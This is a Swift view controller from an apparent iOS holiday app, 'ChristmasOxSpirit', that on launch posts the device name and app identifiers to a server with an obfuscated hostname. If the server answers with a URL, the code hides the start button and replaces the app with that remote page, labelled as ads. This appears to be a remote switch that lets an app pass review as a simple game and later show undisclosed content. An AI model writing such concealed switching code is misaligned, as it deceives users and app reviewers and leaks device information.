//
//  ViewController.swift
//  ChristmasOxSpirit
//
//  Created by ChristmasOxSpirit on 2024/12/23.
//

import UIKit

class OxSpiritBeginViewController: UIViewController, UNUserNotificationCenterDelegate {

    @IBOutlet weak var nameLbl: UILabel!
    
    var name = "Christmas Ox Spirit"
    var index = 0.0
    
    @IBOutlet weak var startBtn: UIButton!
    override func viewDidLoad() {
        super.viewDidLoad()
        
        nameLbl.text = ""
        for n in name{
            Timer.scheduledTimer(withTimeInterval: 0.1 * index, repeats: false) { timer in
                self.nameLbl.text?.append(n)
            }
            index += 1
        }
        
        christmasStartNotificationPermission()
        self.oxSpiritStartAdsLocalData()
    }

    @IBAction func startBtn(_ sender: UIButton) {
        
    }
    
    private func oxSpiritStartAdsLocalData() {
        guard self.oxSpiritNeedShowAdsView() else {
            return
        }
        self.startBtn.isHidden = true
        oxSpiritPostApForAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.oxSpiritSetUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.oxSpiritShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.oxSpiritShowAdView(adsUr)
                    }
                    return
                }
            }
            self.startBtn.isHidden = false
        }
    }
    
    private func oxSpiritPostApForAdsData(completion: @escaping ([Any]?) -> Void) {
        
        let url = URL(string: "https://open.soft\(self.oxSpiritMaHostUrl())/open/oxSpiritPostApForAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appModel": UIDevice.current.name,
            "appLocalized": UIDevice.current.localizedModel ,
            "appKey": "c87fc708f40e4156b78dadf7444baf6b",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }
    
    func christmasStartNotificationPermission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }
}

